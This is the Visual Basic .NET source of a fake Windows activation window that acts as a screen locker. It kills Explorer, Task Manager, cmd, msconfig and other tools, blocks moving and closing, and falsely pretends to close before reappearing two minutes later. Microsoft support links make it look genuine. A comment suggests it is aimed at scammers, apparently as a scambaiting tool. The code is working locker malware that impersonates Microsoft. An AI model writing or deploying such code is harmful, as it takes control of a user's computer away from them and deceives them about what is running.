Public Class Form1
    Protected Overrides Sub WndProc(ByRef m As Message)
        Const WM_SYSCOMMAND As Integer = &H112
        Const SC_MOVE As Integer = &HF010

        Select Case m.Msg
            Case WM_SYSCOMMAND
                Dim command As Integer = m.WParam.ToInt32() And &HFFF0
                If command = SC_MOVE Then
                    Return
                End If
        End Select

        MyBase.WndProc(m)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        taskmgrTimer.Interval = 1000
        taskmgrTimer.Start()

        'Kill explorer as soon as the application is opened
        Shell("taskkill /F /IM explorer.exe")

        'Force kill processes tipically used by scammers
        For Each p As Process In Process.GetProcesses
            If p.ProcessName = "iexplore" Or p.ProcessName = "msinfo32" Or p.ProcessName = "mmc" Or p.ProcessName = "dxdiag" Or p.ProcessName = "msconfig" Or p.ProcessName = "taskmgr" Or p.ProcessName = "cmd" Or p.ProcessName = "notepad" Or p.ProcessName = "syskey" Then
                p.Kill()
                Exit For
            End If
        Next
    End Sub

    Private Sub taskmgrTimer_Tick(sender As Object, e As EventArgs) Handles taskmgrTimer.Tick
        'Suppress the Task Manager
        'Doesn't work in Windows 8.1 and superior
        For Each p As Process In Process.GetProcesses
            If p.ProcessName = "taskmgr" Then
                p.Kill()
                Exit For
            End If
        Next
    End Sub

    Private Sub activateBtn_Click(sender As Object, e As EventArgs) Handles activateBtn.Click
        'Hide the current form and proceed to the next step
        Me.Hide()
        Form2.Show()
    End Sub

    Private Sub retypeBtn_Click(sender As Object, e As EventArgs) Handles retypeBtn.Click
        'Hide the current form and proceed to the next step
        Me.Hide()
        Form2.Show()
    End Sub

    Private Sub skipBtn_Click(sender As Object, e As EventArgs) Handles skipBtn.Click
        'Restart explorer and pretend the application is closed
        Dim ExecProcess = New Process()
        ExecProcess.StartInfo.UseShellExecute = True
        ExecProcess.StartInfo.CreateNoWindow = True
        ExecProcess.StartInfo.FileName = "C:\Windows\explorer.exe"
        ExecProcess.StartInfo.WorkingDirectory = Application.StartupPath
        ExecProcess.Start()

        'Hide the application...
        Me.Hide()
        '...for 2 minutes (120000ms)
        Threading.Thread.Sleep(120000)
        'Threading.Thread.Sleep(2000) 'Testing
        Shell("taskkill /F /IM explorer.exe")
        For Each p As Process In Process.GetProcesses()
            If p.ProcessName = "iexplore" Or p.ProcessName = "msinfo32" Or p.ProcessName = "mmc" Or p.ProcessName = "dxdiag" Or p.ProcessName = "msconfig" Or p.ProcessName = "taskmgr" Or p.ProcessName = "cmd" Or p.ProcessName = "notepad" Or p.ProcessName = "syskey" Then
                p.Kill()
            End If
        Next
        Me.activateBtn.Select()
        Me.Show()
    End Sub

    Private Sub helpActivationLinkLabel_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles helpActivationLinkLabel.LinkClicked
        Dim ActivationAddress As String = "https://support.microsoft.com/en-us/help/15083/windows-how-to-activate"
        Process.Start(ActivationAddress)
    End Sub

    Private Sub privacyLinkLabel_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles privacyLinkLabel.LinkClicked
        Dim PrivacyAddress As String = "https://privacy.microsoft.com/en-us/privacystatement"
        Process.Start(PrivacyAddress)
    End Sub

    Private Sub cancelBtn_Click(sender As Object, e As EventArgs) Handles cancelBtn.Click
        'Restart explorer and pretend the application is closed
        Dim ExecProcess = New Process()
        ExecProcess.StartInfo.UseShellExecute = True
        ExecProcess.StartInfo.CreateNoWindow = True
        ExecProcess.StartInfo.FileName = "C:\Windows\explorer.exe"
        ExecProcess.StartInfo.WorkingDirectory = Application.StartupPath
        ExecProcess.Start()

        'Hide the application...
        Me.Hide()
        '...for 2 minutes (120000ms)
        Threading.Thread.Sleep(120000)
        'Threading.Thread.Sleep(2000) 'Testing
        Shell("taskkill /F /IM explorer.exe")
        For Each p As Process In Process.GetProcesses()
            If p.ProcessName = "iexplore" Or p.ProcessName = "msinfo32" Or p.ProcessName = "mmc" Or p.ProcessName = "dxdiag" Or p.ProcessName = "msconfig" Or p.ProcessName = "taskmgr" Or p.ProcessName = "cmd" Or p.ProcessName = "notepad" Or p.ProcessName = "syskey" Or p.ProcessName = "iexplore" Then
                p.Kill()
            End If
        Next
        Me.Show()
    End Sub

    Private Sub Form1_Closing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles Me.FormClosing
        'The user can't close the application
        If e.CloseReason = CloseReason.UserClosing Then
            e.Cancel = True

            'Restart explorer and pretend the application is closed
            Dim ExecProcess = New Process()
            ExecProcess.StartInfo.UseShellExecute = True
            ExecProcess.StartInfo.CreateNoWindow = True
            ExecProcess.StartInfo.FileName = "C:\Windows\explorer.exe"
            ExecProcess.StartInfo.WorkingDirectory = Application.StartupPath
            ExecProcess.Start()

            'Hide the application...
            Me.Hide()
            '...for 2 minutes (120000ms)
            Threading.Thread.Sleep(120000)
            'Threading.Thread.Sleep(2000) 'Testing

            'Force kill the processes again and show the application
            Shell("taskkill /F /IM explorer.exe")
            For Each p As Process In Process.GetProcesses()
                If p.ProcessName = "iexplore" Or p.ProcessName = "msinfo32" Or p.ProcessName = "mmc" Or p.ProcessName = "dxdiag" Or p.ProcessName = "msconfig" Or p.ProcessName = "taskmgr" Or p.ProcessName = "cmd" Or p.ProcessName = "notepad" Or p.ProcessName = "syskey" Or p.ProcessName = "iexplore" Then
                    p.Kill()
                End If
            Next
            Me.Show()
        Else
            'Restart explorer and close the application
            Dim ExecProcess = New Process()
            ExecProcess.StartInfo.UseShellExecute = True
            ExecProcess.StartInfo.CreateNoWindow = True
            ExecProcess.StartInfo.FileName = "C:\Windows\explorer.exe"
            ExecProcess.StartInfo.WorkingDirectory = Application.StartupPath
            ExecProcess.Start()

            Application.Exit()
        End If
    End Sub
End Class
